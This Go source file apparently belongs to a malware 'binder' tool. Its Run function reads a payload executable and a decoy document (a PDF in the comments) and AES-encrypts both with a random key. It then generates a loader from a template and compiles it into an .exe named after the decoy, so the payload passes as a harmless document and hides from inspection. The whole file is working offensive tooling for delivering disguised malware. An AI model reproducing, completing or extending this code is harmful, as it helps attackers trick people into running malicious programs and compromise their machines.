package binder

import (
	_ "fmt"
	"github.com/derian/binder/pkg/encode"
	"github.com/derian/binder/pkg/util"
	"github.com/zan8in/gologger"
	"os"
	"path/filepath"
	"strings"
)

func Run(options *Options) error {
	payloadFileName := options.Payload // EnumFontsW4188d.exe
	fileName := options.File           // 测试.pdf
	// 1.判断文件是否存在
	exists, err := util.FileExists(payloadFileName)
	if !exists {
		return err
	}
	exists1, err := util.FileExists(fileName)
	if !exists1 {
		return err
	}
	// 2.读取文件内容
	payloadByteData, _ := os.ReadFile(payloadFileName)
	fileByteData, _ := os.ReadFile(fileName)
	// 3.使用AES加密
	randomKey, _ := util.GenerateRandomString(32)
	encryptPayload, err := encode.AesEncrypt(payloadByteData, []byte(randomKey))
	if err != nil {
		gologger.Error().Msgf("文件 %s AES加密失败\n", payloadFileName)
		return err
	}
	gologger.Info().Msgf("文件 %s AES加密成功\n", payloadFileName)
	encryptFile, err := encode.AesEncrypt(fileByteData, []byte(randomKey))
	if err != nil {
		gologger.Error().Msgf("文件 %s AES加密失败\n", fileName)
		return err
	}
	gologger.Info().Msgf("文件 %s AES加密成功\n", fileName)
	// 4.保存exe文件的路径
	resultDir := options.Output // 默认 result目录
	isExit, _ := util.FileExists(resultDir)
	if !isExit {
		os.Mkdir(resultDir, 0644)
	}
	// 6.替换到模板中,生成最终的go文件(捆绑了两个文件的源文件)
	argSlice := []string{"demo1", fileName, randomKey, encryptPayload, encryptFile, resultDir}
	goFileName := util.GenGoFile(argSlice)

	// 5.编译go文件
	// goFileName result\a8f6773c99.go
	parts := strings.Split(fileName, ".")
	name := parts[0] + ".exe"
	exeFilePath := filepath.Join(resultDir, name)
	if err := util.BuildLoaderFile(goFileName, exeFilePath); err != nil {
		return err
	}
	// 6.删除go文件
	//os.Remove(goFileName)
	return nil
}
